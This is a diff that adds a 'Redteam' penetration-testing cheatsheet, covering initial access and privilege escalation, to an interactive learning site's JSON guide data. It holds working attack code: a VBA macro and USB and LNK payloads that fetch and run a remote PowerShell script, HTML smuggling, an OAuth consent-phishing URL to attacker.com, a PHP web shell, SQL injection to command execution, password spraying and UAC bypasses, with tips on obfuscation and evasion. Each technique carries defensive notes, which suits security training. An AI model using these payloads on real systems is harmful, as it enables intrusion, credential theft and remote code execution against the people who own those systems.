@@ -35,6 +35,17 @@
       },
       "status": "Explore the guide",
       "href": "#/guide/react-basics-lab"
+    },
+    {
+      "id": "red",
+      "title": "Redteam",
+      "color": "bg-red-800/80",
+      "tag": {
+        "name": "Redteam",
+        "color": "bg-gray-500/50 text-white"
+      },
+      "status": "Explore the guide",
+      "href": "#/guide/red"
     }
   ],
   "guideData": {
@@ -4372,6 +4383,1601 @@
               "type": "p",
               "parts": [
                 "***"
+              ]
+            }
+          ]
+        }
+      ]
+    },
+    "red": {
+      "title": "Redteam Interactive Guide",
+      "topics": [
+        {
+          "id": "toc",
+          "title": "Welcome to Redteam",
+          "content": [
+            {
+              "type": "p",
+              "parts": [
+                "Complete ",
+                "**Penetration Testing**",
+                " & ",
+                "**Red Team Cheatsheet**"
+              ]
+            },
+            {
+              "type": "ol",
+              "items": [
+                {
+                  "parts": [
+                    "🛬 ",
+                    "**Initial Access**"
+                  ]
+                }
+              ]
+            },
+            {
+              "type": "p",
+              "parts": [
+                "1.1 ",
+                "**Phishing**",
+                " (Spear, Maldoc)\nWhat it is and Why it Matters: ",
+                "**Social engineering attacks**",
+                " using email to deliver ",
+                "**malicious content**",
+                ". It is the most common ",
+                "**initial access vector**",
+                ", bypassing ",
+                "**technical controls**",
+                " by targeting ",
+                "**humans**",
+                "."
+              ]
+            },
+            {
+              "type": "p",
+              "parts": [
+                "Quick Steps / Commands:"
+              ]
+            },
+            {
+              "type": "p",
+              "parts": [
+                "**Malicious Word Macro (Maldoc)**",
+                ":"
+              ]
+            },
+            {
+              "type": "code",
+              "language": "vba",
+              "text": "' Create .docm file with VBA macro\nSub AutoOpen()\n    Dim str As String\n    str = \"powershell -w hidden -nop -c IEX((New-Object Net.WebClient).DownloadString('http://10.10.14.20/shell.ps1'))\"\n    Shell str, vbHide\nEnd Sub\n\n' Alternative for different Office versions\nSub Document_Open()\n    AutoOpen\nEnd Sub\n\nSub Workbook_Open()\n    AutoOpen\nEnd Sub"
+            },
+            {
+              "type": "p",
+              "parts": [
+                "**HTML Smuggling**",
+                ":"
+              ]
+            },
+            {
+              "type": "code",
+              "language": "html",
+              "text": "<script>\nconst blob = new Blob([atob(\"BASE64_PAYLOAD\")], { type: 'application/octet-stream' });\nconst url = URL.createObjectURL(blob);\nconst a = document.createElement(\"a\");\na.href = url;\na.download = \"Invoice.pdf.exe\";\ndocument.body.appendChild(a);\na.click();\ndocument.body.removeChild(a);\n</script>"
+            },
+            {
+              "type": "p",
+              "parts": [
+                "**Consent Phishing (OAuth Abuse)**",
+                ":"
+              ]
+            },
+            {
+              "type": "code",
+              "language": "bash",
+              "text": "# Register malicious Azure app with high permissions\n# Craft authorization URL:\nhttps://login.microsoftonline.com/common/oauth2/v2.0/authorize?\nclient_id=MALICIOUS_APP_ID&\nresponse_type=code&\nredirect_uri=https://attacker.com/callback&\nscope=Mail.Read+Files.Read.All+offline_access"
+            },
+            {
+              "type": "p",
+              "parts": [
+                "What to Expect: User executes ",
+                "**macro**",
+                "/clicks link, leading to ",
+                "**shell access**",
+                ". Success depends on ",
+                "**social engineering**",
+                " and ",
+                "**security controls**",
+                "."
+              ]
+            },
+            {
+              "type": "p",
+              "parts": [
+                "Detection / Hardening:"
+              ]
+            },
+            {
+              "type": "ul",
+              "items": [
+                {
+                  "parts": [
+                    "Block ",
+                    "**macros from internet files**",
+                    " via ",
+                    "**GPO**"
+                  ]
+                },
+                {
+                  "parts": [
+                    "Monitor ",
+                    {
+                      "type": "inline_code",
+                      "text": "winword.exe"
+                    },
+                    " → ",
+                    {
+                      "type": "inline_code",
+                      "text": "powershell.exe"
+                    },
+                    " ",
+                    "**process chains**"
+                  ]
+                },
+                {
+                  "parts": [
+                    "**Email filtering**",
+                    " for malicious attachments"
+                  ]
+                },
+                {
+                  "parts": [
+                    "User ",
+                    "**security awareness training**"
+                  ]
+                },
+                {
+                  "parts": [
+                    "**Application whitelisting**"
+                  ]
+                }
+              ]
+            },
+            {
+              "type": "p",
+              "parts": [
+                "Tools / References: ",
+                "**GoPhish**",
+                ", ",
+                "**King Phisher**",
+                ", ",
+                "**SET**",
+                ", ",
+                "**MSFVenom**",
+                ", ",
+                "**Evilginx2**"
+              ]
+            },
+            {
+              "type": "p",
+              "parts": [
+                "OPSEC / Notes: Use ",
+                "**realistic lures**",
+                ", ",
+                "**obfuscate macros**",
+                ", test against ",
+                "**email security controls**",
+                "."
+              ]
+            },
+            {
+              "type": "p",
+              "parts": [
+                "1.2 ",
+                "**Valid Accounts**",
+                "\nWhat it is and Why it Matters: Using ",
+                "**legitimate credentials**",
+                " to access systems. Often obtained through ",
+                "**password spraying**",
+                ", ",
+                "**breach dumps**",
+                ", or ",
+                "**weak default credentials**",
+                "."
+              ]
+            },
+            {
+              "type": "p",
+              "parts": [
+                "Quick Steps / Commands:"
+              ]
+            },
+            {
+              "type": "p",
+              "parts": [
+                "**Password Spraying**",
+                ":"
+              ]
+            },
+            {
+              "type": "code",
+              "language": "bash",
+              "text": "# CrackMapExec for SMB spraying\ncrackmapexec smb 10.10.10.0/24 -u users.txt -p 'Spring2024!' --no-bruteforce\n\n# Domain password spray with PowerView\nInvoke-DomainPasswordSpray -UserList users.txt -Password 'Spring2024!' -Domain corp.local\n\n# Kerberos pre-auth spraying\nGetNPUsers.py -no-pass -usersfile users.txt -dc-ip 10.10.10.2 corp.local/"
+            },
+            {
+              "type": "p",
+              "parts": [
+                "**Credential Stuffing**",
+                ":"
+              ]
+            },
+            {
+              "type": "code",
+              "language": "bash",
+              "text": "# Use breach-compromised credentials\ncrackmapexec smb 10.10.10.0/24 -u breached_users.txt -p breached_passwords.txt\n\n# With known valid domain\ncrackmapexec smb 10.10.10.0/24 -u user -p password -d corp.local"
+            },
+            {
+              "type": "p",
+              "parts": [
+                "**Default Credentials**",
+                ":"
+              ]
+            },
+            {
+              "type": "code",
+              "language": "bash",
+              "text": "# Common default credentials\n# admin:admin, administrator:password, guest:guest\ncrackmapexec smb 10.10.10.0/24 -u default_users.txt -p default_passwords.txt"
+            },
+            {
+              "type": "p",
+              "parts": [
+                "What to Expect: Valid ",
+                "**domain**",
+                " or ",
+                "**local account access**",
+                ". May trigger ",
+                "**account lockout policies**",
+                "."
+              ]
+            },
+            {
+              "type": "p",
+              "parts": [
+                "Detection / Hardening:"
+              ]
+            },
+            {
+              "type": "ul",
+              "items": [
+                {
+                  "parts": [
+                    "**Account lockout policies**",
+                    " (5-10 attempts)"
+                  ]
+                },
+                {
+                  "parts": [
+                    "**Multi-Factor Authentication (MFA)**"
+                  ]
+                },
+                {
+                  "parts": [
+                    "**Impossible travel detection**"
+                  ]
+                },
+                {
+                  "parts": [
+                    "**Login time restrictions**"
+                  ]
+                },
+                {
+                  "parts": [
+                    "**Regular password rotation**"
+                  ]
+                }
+              ]
+            },
+            {
+              "type": "p",
+              "parts": [
+                "Tools / References: ",
+                "**CrackMapExec**",
+                ", ",
+                "**Hydra**",
+                ", ",
+                "**Metasploit**",
+                ", ",
+                "**PowerView**"
+              ]
+            },
+            {
+              "type": "p",
+              "parts": [
+                "OPSEC / Notes: Avoid ",
+                "**account lockouts**",
+                ", use ",
+                "**low-and-slow approaches**",
+                ", research target ",
+                "**password policies**",
+                "."
+              ]
+            },
+            {
+              "type": "p",
+              "parts": [
+                "1.3 ",
+                "**Drive-by Compromise**",
+                "\nWhat it is and Why it Matters: Compromising users when they visit ",
+                "**malicious websites**",
+                " that exploit ",
+                "**browser vulnerabilities**",
+                " or ",
+                "**social engineering**",
+                "."
+              ]
+            },
+            {
+              "type": "p",
+              "parts": [
+                "Quick Steps / Commands:"
+              ]
+            },
+            {
+              "type": "p",
+              "parts": [
+                "**Browser Exploit Delivery**",
+                ":"
+              ]
+            },
+            {
+              "type": "code",
+              "language": "bash",
+              "text": "# Metasploit browser exploit\nuse exploit/multi/browser/java_jre17_driver_manager\nset payload windows/meterpreter/reverse_https\nset LHOST 10.10.14.20\nset LPORT 443\nexploit\n\n# Generate malicious iframe\n<iframe src=\"http://10.10.14.20:8080/exploit\" width=\"0\" height=\"0\" style=\"border:0; display:none;\"></iframe>"
+            },
+            {
+              "type": "p",
+              "parts": [
+                "**Fake Updates**",
+                ":"
+              ]
+            },
+            {
+              "type": "code",
+              "language": "javascript",
+              "text": "// JavaScript fake update prompt\nif(confirm(\"Adobe Flash Player update required. Install now?\")) {\n    window.location = \"http://10.10.14.20/FlashPlayer_installer.exe\";\n}"
+            },
+            {
+              "type": "p",
+              "parts": [
+                "**Watering Hole Attacks**",
+                ":"
+              ]
+            },
+            {
+              "type": "code",
+              "language": "bash",
+              "text": "# Compromise legitimate website\n# Inject malicious code into frequently visited site\n<script src=\"http://10.10.14.20/exploit.js\"></script>"
+            },
+            {
+              "type": "p",
+              "parts": [
+                "What to Expect: ",
+                "**Shell access**",
+                " when a user visits a ",
+                "**compromised site**",
+                " with a vulnerable browser/plugins."
+              ]
+            },
+            {
+              "type": "p",
+              "parts": [
+                "Detection / Hardening:"
+              ]
+            },
+            {
+              "type": "ul",
+              "items": [
+                {
+                  "parts": [
+                    "**Network monitoring**",
+                    " for ",
+                    "**beaconing**"
+                  ]
+                },
+                {
+                  "parts": [
+                    "**Browser isolation**",
+                    " technologies"
+                  ]
+                },
+                {
+                  "parts": [
+                    "**Content Security Policy (CSP)**"
+                  ]
+                },
+                {
+                  "parts": [
+                    "Regular ",
+                    "**browser/plugin updates**"
+                  ]
+                },
+                {
+                  "parts": [
+                    "**EDR monitoring**",
+                    " browser child processes"
+                  ]
+                }
+              ]
+            },
+            {
+              "type": "p",
+              "parts": [
+                "Tools / References: ",
+                "**Metasploit**",
+                ", ",
+                "**BeEF**",
+                ", ",
+                "**Social Engineer Toolkit**"
+              ]
+            },
+            {
+              "type": "p",
+              "parts": [
+                "OPSEC / Notes: Use ",
+                "**SSL certificates**",
+                ", reputable-looking domains, test ",
+                "**exploit reliability**",
+                "."
+              ]
+            },
+            {
+              "type": "p",
+              "parts": [
+                "1.4 ",
+                "**Exploits**",
+                " (",
+                "**RCE**",
+                ", ",
+                "**0-days**",
+                ")\nWhat it is and Why it Matters: Leveraging ",
+                "**software vulnerabilities**",
+                " for ",
+                "**remote code execution (RCE)**",
+                ", from ",
+                "**public exploits**",
+                " to undisclosed ",
+                "**zero-days (0-days)**",
+                "."
+              ]
+            },
+            {
+              "type": "p",
+              "parts": [
+                "Quick Steps / Commands:"
+              ]
+            },
+            {
+              "type": "p",
+              "parts": [
+                "**Public Exploit Usage**",
+                ":"
+              ]
+            },
+            {
+              "type": "code",
+              "language": "bash",
+              "text": "# Search for exploits\nsearchsploit \"Apache 2.4.49\"\nsearchsploit \"Windows SMB\"\n\n# Metasploit modules\nuse exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS 10.10.10.10\nexploit\n\n# Manual exploit compilation\ngcc -o exploit exploit.c\n./exploit"
+            },
+            {
+              "type": "p",
+              "parts": [
+                "**Web Application RCE**",
+                ":"
+              ]
+            },
+            {
+              "type": "code",
+              "language": "bash",
+              "text": "# SQL injection to RCE\n'; EXEC xp_cmdshell 'whoami' --\n\n# File upload RCE\n<?php system($_GET['cmd']); ?>\n\n# Deserialization attacks\njava -jar ysoserial.jar CommonsCollections1 'cmd.exe /c whoami' > payload.ser"
+            },
+            {
+              "type": "p",
+              "parts": [
+                "**Service Exploitation**",
+                ":"
+              ]
+            },
+            {
+              "type": "code",
+              "language": "bash",
+              "text": "# SSH exploitation\nuse auxiliary/scanner/ssh/ssh_login\nset RHOSTS 10.10.10.0/24\nset USERNAME root\nset PASS_FILE /usr/share/wordlists/rockyou.txt\nrun\n\n# Database exploitation\nuse auxiliary/scanner/mysql/mysql_login\nset RHOSTS 10.10.10.0/24\nrun"
+            },
+            {
+              "type": "p",
+              "parts": [
+                "What to Expect: Direct ",
+                "**system access**",
+                " through ",
+                "**software vulnerabilities**",
+                ". May cause ",
+                "**service disruption**",
+                "."
+              ]
+            },
+            {
+              "type": "p",
+              "parts": [
+                "Detection / Hardening:"
+              ]
+            },
+            {
+              "type": "ul",
+              "items": [
+                {
+                  "parts": [
+                    "Regular ",
+                    "**vulnerability scanning**"
+                  ]
+                },
+                {
+                  "parts": [
+                    "**Patch management**"
+                  ]
+                },
+                {
+                  "parts": [
+                    "**WAF implementation**"
+                  ]
+                },
+                {
+                  "parts": [
+                    "**Network segmentation**"
+                  ]
+                },
+                {
+                  "parts": [
+                    "**EDR exploit prevention**"
+                  ]
+                }
+              ]
+            },
+            {
+              "type": "p",
+              "parts": [
+                "Tools / References: ",
+                "**Metasploit**",
+                ", ",
+                "**SearchSploit**",
+                ", ",
+                "**Nuclei**",
+                ", ",
+                "**Custom exploit code**"
+              ]
+            },
+            {
+              "type": "p",
+              "parts": [
+                "OPSEC / Notes: Research ",
+                "**target environment**",
+                ", test ",
+                "**exploits in a lab**",
+                ", have ",
+                "**fallback methods**",
+                "."
+              ]
+            },
+            {
+              "type": "p",
+              "parts": [
+                "1.5 ",
+                "**USB/Removable Media Attacks**",
+                "\nWhat it is and Why it Matters: ",
+                "**Physical attacks**",
+                " using ",
+                "**USB devices**",
+                " for ",
+                "**initial access**",
+                ", particularly effective in ",
+                "**air-gapped environments**",
+                "."
+              ]
+            },
+            {
+              "type": "p",
+              "parts": [
+                "Quick Steps / Commands:"
+              ]
+            },
+            {
+              "type": "p",
+              "parts": [
+                "**Bad USB Attacks**",
+                ":"
+              ]
+            },
+            {
+              "type": "code",
+              "language": "bash",
+              "text": "# Rubber Ducky payload\nDELAY 2000\nGUI r\nDELAY 500\nSTRING powershell -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.20/shell.ps1')\"\nENTER\n\n# Teensy payload\nvoid setup() {\n    Keyboard.begin();\n    delay(3000);\n    Keyboard.press(KEY_LEFT_GUI);\n    Keyboard.press('r');\n    Keyboard.releaseAll();\n    delay(500);\n    Keyboard.print(\"cmd.exe /c powershell -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.20/shell.ps1')\");\n    Keyboard.press(KEY_RETURN);\n    Keyboard.releaseAll();\n}"
+            },
+            {
+              "type": "p",
+              "parts": [
+                "**AutoRun .inf Files**",
+                ":"
+              ]
+            },
+            {
+              "type": "code",
+              "language": "ini",
+              "text": "[autorun]\nopen=malware.exe\nicon=malware.exe\naction=Open documents\nlabel=Corporate Files"
+            },
+            {
+              "type": "p",
+              "parts": [
+                "**LNK File Attacks**",
+                ":"
+              ]
+            },
+            {
+              "type": "code",
+              "language": "powershell",
+              "text": "# Malicious LNK file\n$WshShell = New-Object -comObject WScript.Shell\n$Shortcut = $WshShell.CreateShortcut(\"Important Documents.lnk\")\n$Shortcut.TargetPath = \"cmd.exe\"\n$Shortcut.Arguments = \"/c powershell -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.20/shell.ps1')\"\n$Shortcut.Save()"
+            },
+            {
+              "type": "p",
+              "parts": [
+                "What to Expect: ",
+                "**Physical access**",
+                " required. Success depends on ",
+                "**AutoRun settings**",
+                " and ",
+                "**user behavior**",
+                "."
+              ]
+            },
+            {
+              "type": "p",
+              "parts": [
+                "Detection / Hardening:"
+              ]
+            },
+            {
+              "type": "ul",
+              "items": [
+                {
+                  "parts": [
+                    "**Disable AutoRun**",
+                    " via ",
+                    "**GPO**"
+                  ]
+                },
+                {
+                  "parts": [
+                    "**USB device control policies**"
+                  ]
+                },
+                {
+                  "parts": [
+                    "**User training**",
+                    " on unknown devices"
+                  ]
+                },
+                {
+                  "parts": [
+                    "**Endpoint monitoring**",
+                    " for USB devices"
+                  ]
+                },
+                {
+                  "parts": [
+                    "**Application whitelisting**"
+                  ]
+                }
+              ]
+            },
+            {
+              "type": "p",
+              "parts": [
+                "Tools / References: ",
+                "**USB Rubber Ducky**",
+                ", ",
+                "**Teensy**",
+                ", ",
+                "**PoisonTap**",
+                ", ",
+                "**Evilduino**"
+              ]
+            },
+            {
+              "type": "p",
+              "parts": [
+                "OPSEC / Notes: Consider ",
+                "**physical security**",
+                ", use ",
+                "**convincing device labels**",
+                ", test on ",
+                "**target OS versions**",
+                "."
+              ]
+            },
+            {
+              "type": "hr"
+            },
+            {
+              "type": "ol",
+              "items": [
+                {
+                  "parts": [
+                    "🚀 ",
+                    "**Privilege Escalation**"
+                  ]
+                }
+              ]
+            },
+            {
+              "type": "p",
+              "parts": [
+                "4.1 ",
+                "**Token Manipulation**",
+                "\nWhat it is and Why it Matters: Abusing ",
+                "**Windows access tokens**",
+                " to impersonate ",
+                "**higher-privileged users**",
+                " or the ",
+                "**SYSTEM account**",
+                "."
+              ]
+            },
+            {
+              "type": "p",
+              "parts": [
+                "Quick Steps / Commands:"
+              ]
+            },
+            {
+              "type": "p",
+              "parts": [
+                "**Mimikatz Token Commands**",
+                ":"
+              ]
+            },
+            {
+              "type": "code",
+              "language": "bash",
+              "text": "# Load incognito in meterpreter\nmeterpreter > load incognito\n\n# List available tokens\nmeterpreter > list_tokens -u\n\n# Impersonate token\nmeterpreter > impersonate_token \"NT AUTHORITY\\\\SYSTEM\"\nmeterpreter > impersonate_token \"DOMAIN\\\\Administrator\"\n\n# Revert to original token\nmeterpreter > revert_to_self"
+            },
+            {
+              "type": "p",
+              "parts": [
+                "**Rotten Potato/Juicy Potato**",
+                ":"
+              ]
+            },
+            {
+              "type": "code",
+              "language": "bash",
+              "text": "# Juicy Potato for SERVICE -> SYSTEM\nJuicyPotato.exe -l 1337 -p C:\\Windows\\System32\\cmd.exe -a \"/c whoami\" -t *\n\n# Rotten Potato from meterpreter\nmeterpreter > upload /usr/share/webshells/rottenpotato.exe\nmeterpreter > execute -H -c -f rottenpotato.exe\nmeterpreter > getuid"
+            },
+            {
+              "type": "p",
+              "parts": [
+                "**PowerShell Token Manipulation**",
+                ":"
+              ]
+            },
+            {
+              "type": "code",
+              "language": "powershell",
+              "text": "# Check current token privileges\nwhoami /priv\nwhoami /groups\n\n# PowerShell Incognito\nImport-Module .\\Incognito.ps1\nInvoke-TokenManipulation -ImpersonateUser -Username \"DOMAIN\\Administrator\"\n\n# Check for SeImpersonate privilege\n([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] \"Administrator\")"
+            },
+            {
+              "type": "p",
+              "parts": [
+                "What to Expect: Ability to execute commands as different users, often ",
+                "**SYSTEM privileges**",
+                " from ",
+                "**service accounts**",
+                "."
+              ]
+            },
+            {
+              "type": "p",
+              "parts": [
+                "Detection / Hardening:"
+              ]
+            },
+            {
+              "type": "ul",
+              "items": [
+                {
+                  "parts": [
+                    "Monitor ",
+                    "**token manipulation**",
+                    " (",
+                    "**Event ID 4672**",
+                    ")"
+                  ]
+                },
+                {
+                  "parts": [
+                    "**EDR detection**",
+                    " of ",
+                    "**token theft patterns**"
+                  ]
+                },
+                {
+                  "parts": [
+                    "Limit ",
+                    "**SeDebugPrivilege**",
+                    " and ",
+                    "**SeImpersonatePrivilege**"
+                  ]
+                },
+                {
+                  "parts": [
+                    "**Protected Process Light (PPL)**"
+                  ]
+                },
+                {
+                  "parts": [
+                    "Regular ",
+                    "**privilege audits**"
+                  ]
+                }
+              ]
+            },
+            {
+              "type": "p",
+              "parts": [
+                "Tools / References: ",
+                "**Mimikatz**",
+                ", ",
+                "**Incognito**",
+                ", ",
+                "**Juicy Potato**",
+                ", ",
+                "**Metasploit token modules**"
+              ]
+            },
+            {
+              "type": "p",
+              "parts": [
+                "OPSEC / Notes: Use from ",
+                "**service accounts**",
+                " with ",
+                "**SeImpersonate**",
+                ", avoid obvious ",
+                "**process injection**",
+                ", ",
+                "**clean up tokens**",
+                "."
+              ]
+            },
+            {
+              "type": "p",
+              "parts": [
+                "4.2 ",
+                "**UAC Bypass**",
+                "\nWhat it is and Why it Matters: Bypassing ",
+                "**User Account Control (UAC)**",
+                " prompts to execute code with ",
+                "**elevated privileges**",
+                " without user interaction."
+              ]
+            },
+            {
+              "type": "p",
+              "parts": [
+                "Quick Steps / Commands:"
+              ]
+            },
+            {
+              "type": "p",
+              "parts": [
+                "**FodHelper UAC Bypass**",
+                ":"
+              ]
+            },
+            {
+              "type": "code",
+              "language": "cmd",
+              "text": "# Registry modification for fodhelper\nreg add \"HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command\" /d \"C:\\malware.exe\" /f\nreg add \"HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command\" /v \"DelegateExecute\" /f\nfodhelper.exe\n\n# Cleanup\nreg delete \"HKCU\\Software\\Classes\\ms-settings\\\" /f"
+            },
+            {
+              "type": "p",
+              "parts": [
+                "**Event Viewer UAC Bypass**",
+                ":"
+              ]
+            },
+            {
+              "type": "code",
+              "language": "cmd",
+              "text": "# Using eventvwr.exe\nreg add \"HKCU\\Software\\Classes\\mscfile\\shell\\open\\command\" /d \"C:\\malware.exe\" /f\neventvwr.exe"
+            },
+            {
+              "type": "p",
+              "parts": [
+                "**Metasploit UAC Modules**",
+                ":"
+              ]
+            },
+            {
+              "type": "code",
+              "language": "bash",
+              "text": "# Various UAC bypass modules\nuse exploit/windows/local/bypassuac\nuse exploit/windows/local/bypassuac_injection\nuse exploit/windows/local/bypassuac_eventvwr\nset SESSION 1\nexploit"
+            },
+            {
+              "type": "p",
+              "parts": [
+                "**SilentClean UAC Bypass**",
+                ":"
+              ]
+            },
+            {
+              "type": "code",
+              "language": "cmd",
+              "text": "# Using sdclt.exe\nreg add \"HKCU\\Software\\Classes\\exefile\\shell\\runas\\command\" /d \"C:\\malware.exe\" /f\nsdclt.exe /kickoffelev"
+            },
+            {
+              "type": "p",
+              "parts": [
+                "**PowerShell UAC Bypass**",
+                ":"
+              ]
+            },
+            {
+              "type": "code",
+              "language": "powershell",
+              "text": "# UACME techniques\nImport-Module .\\Invoke-UACBypass.ps1\nInvoke-UACBypass -Payload \"C:\\malware.exe\"\n\n# Check UAC level\n$uacLevel = (Get-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\").EnableLUA\nif ($uacLevel -eq 1) { \"UAC Enabled\" }"
+            },
+            {
+              "type": "p",
+              "parts": [
+                "What to Expect: ",
+                "**Elevated privileges**",
+                " without a ",
+                "**UAC prompt**",
+                ", works on default ",
+                "**UAC settings**",
+                "."
+              ]
+            },
+            {
+              "type": "p",
+              "parts": [
+                "Detection / Hardening:"
+              ]
+            },
+            {
+              "type": "ul",
+              "items": [
+                {
+                  "parts": [
+                    "Monitor ",
+                    "**registry modifications**",
+                    " in ",
+                    {
+                      "type": "inline_code",
+                      "text": "Classes"
+                    },
+                    " keys"
+                  ]
+                },
+                {
+                  "parts": [
+                    "**EDR detection**",
+                    " of ",
+                    "**UAC bypass patterns**"
+                  ]
+                },
+                {
+                  "parts": [
+                    "Set ",
+                    "**UAC to the highest level**"
+                  ]
+                },
+                {
+                  "parts": [
+                    "**AppLocker restrictions**"
+                  ]
+                },
+                {
+                  "parts": [
+                    "**Process monitoring**",
+                    " for elevation patterns"
+                  ]
+                }
+              ]
+            },
+            {
+              "type": "p",
+              "parts": [
+                "Tools / References: ",
+                "**UACME**",
+                ", ",
+                "**Metasploit UAC modules**",
+                ", ",
+                "**PowerShell Empire**"
+              ]
+            },
+            {
+              "type": "p",
+              "parts": [
+                "OPSEC / Notes: Test on ",
+                "**target OS version**",
+                ", use the least noisy method first, ",
+                "**clean registry changes**",
+                "."
+              ]
+            },
+            {
+              "type": "p",
+              "parts": [
+                "4.3 ",
+                "**Kernel Exploits**",
+                "\nWhat it is and Why it Matters: Exploiting ",
+                "**vulnerabilities**",
+                " in the ",
+                "**Windows/Linux kernel**",
+                " to gain ",
+                "**SYSTEM/root privileges**",
+                "."
+              ]
+            },
+            {
+              "type": "p",
+              "parts": [
+                "Quick Steps / Commands:"
+              ]
+            },
+            {
+              "type": "p",
+              "parts": [
+                "**Windows Kernel Exploits**",
+                ":"
+              ]
+            },
+            {
+              "type": "code",
+              "language": "bash",
+              "text": "# Windows Exploit Suggester\npython windows-exploit-suggester.py --database 2021-06-10-mssb.xls --systeminfo systeminfo.txt\n\n# Manual system info collection\nsysteminfo\nwmic qfe get Caption,Description,HotFixID,InstalledOn\n\n# Common Windows kernel exploits\n# MS16-032 (Secondary Logon Handle)\n# MS17-010 (EternalBlue)\n# CVE-2021-1675 (PrintNightmare)\n# CVE-2022-21882 (Win32k Elevation)\n\n# Compile and run exploit\ni686-w64-mingw32-gcc MS16-032.c -o MS16-032.exe\nMS16-032.exe"
+            },
+            {
+              "type": "p",
+              "parts": [
+                "**Linux Kernel Exploits**",
+                ":"
+              ]
+            },
+            {
+              "type": "code",
+              "language": "bash",
+              "text": "# Linux Exploit Suggester\n./linux-exploit-suggester.sh\n\n# DirtyCow (CVE-2016-5195)\ngcc -pthread dirty.c -o dirty -lcrypt\n./dirty\n\n# DirtyPipe (CVE-2022-0847)\ngcc dirtypipe.c -o dirtypipe\n./dirtypipe\n\n# Check kernel version\nuname -a\ncat /proc/version\n\n# Check for SELinux/AppArmor\nsestatus\naa-status"
+            },
+            {
+              "type": "p",
+              "parts": [
+                "**Metasploit Local Exploits**",
+                ":"
+              ]
+            },
+            {
+              "type": "code",
+              "language": "bash",
+              "text": "# Local exploit suggester\nuse post/multi/recon/local_exploit_suggester\nset SESSION 1\nrun\n\n# Specific kernel exploits\nuse exploit/windows/local/ms16_032_secondary_logon_handle_privesc\nset SESSION 1\nexploit"
+            },
+            {
+              "type": "p",
+              "parts": [
+                "What to Expect: ",
+                "**SYSTEM/root privileges**",
+                " if successful, potential ",
+                "**system instability**",
+                " if failed."
+              ]
+            },
+            {
+              "type": "p",
+              "parts": [
+                "Detection / Hardening:"
+              ]
+            },
+            {
+              "type": "ul",
+              "items": [
+                {
+                  "parts": [
+                    "Regular ",
+                    "**patching and updates**"
+                  ]
+                },
+                {
+                  "parts": [
+                    "**EDR kernel-level monitoring**"
+                  ]
+                },
+                {
+                  "parts": [
+                    "**Driver signature enforcement**"
+                  ]
+                },
+                {
+                  "parts": [
+                    "**Kernel Patch Protection (PatchGuard)**"
+                  ]
+                },
+                {
+                  "parts": [
+                    "**System crash analysis**"
+                  ]
+                }
+              ]
+            },
+            {
+              "type": "p",
+              "parts": [
+                "Tools / References: ",
+                "**Windows-Exploit-Suggester**",
+                ", ",
+                "**Linux-Exploit-Suggester**",
+                ", ",
+                "**Metasploit**",
+                ", ",
+                "**ExploitDB**"
+              ]
+            },
+            {
+              "type": "p",
+              "parts": [
+                "OPSEC / Notes: Test ",
+                "**exploits in a similar environment**",
+                " first, have ",
+                "**backup access methods**",
+                ", consider ",
+                "**system stability impact**",
+                "."
+              ]
+            },
+            {
+              "type": "p",
+              "parts": [
+                "4.4 ",
+                "**Unquoted Service Paths**",
+                "\nWhat it is and Why it Matters: ",
+                "**Windows services**",
+                " with ",
+                "**unquoted paths**",
+                " containing spaces can be hijacked by placing ",
+                "**malicious executables**",
+                " in earlier path components."
+              ]
+            },
+            {
+              "type": "p",
+              "parts": [
+                "Quick Steps / Commands:"
+              ]
+            },
+            {
+              "type": "p",
+              "parts": [
+                "**Find Unquoted Service Paths**",
+                ":"
+              ]
+            },
+            {
+              "type": "code",
+              "language": "cmd",
+              "text": "# Using wmic\nwmic service get name,displayname,pathname,startmode | findstr /i auto | findstr /i /v \"c:\\windows\\\\\" | findstr /i /v \"\"\"\n\n# Using sc\nsc qc \"ServiceName\"\n\n# PowerShell method\nGet-WmiObject -Class Win32_Service | Where-Object {$_.PathName -notlike '\"*\"'} | Select-Object Name, PathName"
+            },
+            {
+              "type": "p",
+              "parts": [
+                "**Check Directory Permissions**",
+                ":"
+              ]
+            },
+            {
+              "type": "code",
+              "language": "cmd",
+              "text": "# Using icacls\nicacls \"C:\\Program Files\\Vulnerable App\"\n\n# Using accesschk\naccesschk.exe -uwdq \"C:\\Program Files\\Vulnerable App\"\n\n# PowerShell permissions check\nGet-Acl \"C:\\Program Files\\Vulnerable App\" | Format-List"
+            },
+            {
+              "type": "p",
+              "parts": [
+                "**Exploitation Example**",
+                ":"
+              ]
+            },
+            {
+              "type": "code",
+              "language": "cmd",
+              "text": "# Service path: C:\\Program Files\\Vulnerable App\\service.exe\n# Place malware at: C:\\Program.exe\n\n# Or service path: C:\\Program Files\\Vulnerable Folder\\service.exe  \n# Place malware at: C:\\Program Files\\Vulnerable.exe\n\ncopy malware.exe \"C:\\Program.exe\"\n# Service will try to run C:\\Program.exe instead of intended executable"
+            },
+            {
+              "type": "p",
+              "parts": [
+                "**Automated Tools**",
+                ":"
+              ]
+            },
+            {
+              "type": "code",
+              "language": "powershell",
+              "text": "# PowerUp module\nImport-Module .\\PowerUp.ps1\nInvoke-AllChecks\n\n# WinPEAS for Windows\nwinpeas.exe quiet servicesinfo\n\n# Metasploit module\nuse exploit/windows/local/trusted_service_path\nset SESSION 1\nexploit"
+            },
+            {
+              "type": "p",
+              "parts": [
+                "What to Expect: Service starts your executable instead of the legitimate one when restarted."
+              ]
+            },
+            {
+              "type": "p",
+              "parts": [
+                "Detection / Hardening:"
+              ]
+            },
+            {
+              "type": "ul",
+              "items": [
+                {
+                  "parts": [
+                    "Monitor for ",
+                    "**executables in unusual locations**"
+                  ]
+                },
+                {
+                  "parts": [
+                    "Service executable ",
+                    "**digital signature verification**"
+                  ]
+                },
+                {
+                  "parts": [
+                    "Regular ",
+                    "**service path auditing**"
+                  ]
+                },
+                {
+                  "parts": [
+                    "**EDR detection**",
+                    " of ",
+                    "**service path hijacking**"
+                  ]
+                },
+                {
+                  "parts": [
+                    "**Quote all service paths**",
+                    " in deployments"
+                  ]
+                }
+              ]
+            },
+            {
+              "type": "p",
+              "parts": [
+                "Tools / References: ",
+                "**PowerUp**",
+                ", ",
